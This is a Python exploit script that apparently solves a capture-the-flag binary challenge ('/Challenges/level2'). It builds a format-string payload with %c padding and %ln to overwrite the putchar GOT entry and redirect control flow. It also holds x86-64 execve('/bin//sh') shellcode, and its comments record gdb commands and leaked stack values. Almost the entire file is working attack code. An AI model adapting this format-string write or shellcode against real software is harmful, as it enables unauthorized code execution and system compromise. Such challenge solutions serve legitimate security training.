#!/usr/bin/env python3

import struct

BUF_START = 0x7fffffffe320
# buffer length = 1024
# length of extra stuff after buffer = 40
# then base pointer
# then return address 0x7fffffffe740

# break *(main+194)
# run
# x/1080xb 0x7fffffffe310

# 00601010.f7dd3780.0000000f.00601000.0000000f.ffffe848.f7dd7758.41414141
# /Challenges/level2 ABCDEFGH.%016lx.%016lx.%016lx.%016lx.%016lx.%016lx.%016lx.%016lx

# 0x400490 -> address of putchar@plt
# 0x600a78 minus 8 = 600a70

# 0x4005ec -> address of main

# address to redirect putchar to
jump_addr = 0x4005ec # main
jump_addr = 0x4004b6 # printf
jump_addr = 0x40069f # loop!

num = jump_addr - 11 # max 0x7fffffde

BUF_LEN = 1024
SHELLCODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62" \
          + b"\x69\x6e\x2f\x2f\x73\x68\x57\x54" \
          + b"\x5f\xb0\x3b\x99\x0f\x05"

# struct.pack("Q", BUF_START) \

#payload = b"%016lx.%016lx.%016lx.%016lx.%016lx.%016lx.%016lx." + (b"%c"*128) + b".%016lx.%016lx.%016lx.%016lx.%016lx.%016lx"

# 24+7+4 = 35 chars
payload = b"%c%c%c%c%c%c%c%c%c%c%c%." + str(num).encode() + b"u%ln" \
        + b"?????" \
        + struct.pack("Q", 0x600a78) # address of putchar@plt

print("$'" + "".join([chr(b) if 0x20 <= b < 0x7f else f"\\x{b:02x}" for b in payload]) + "'", end="")
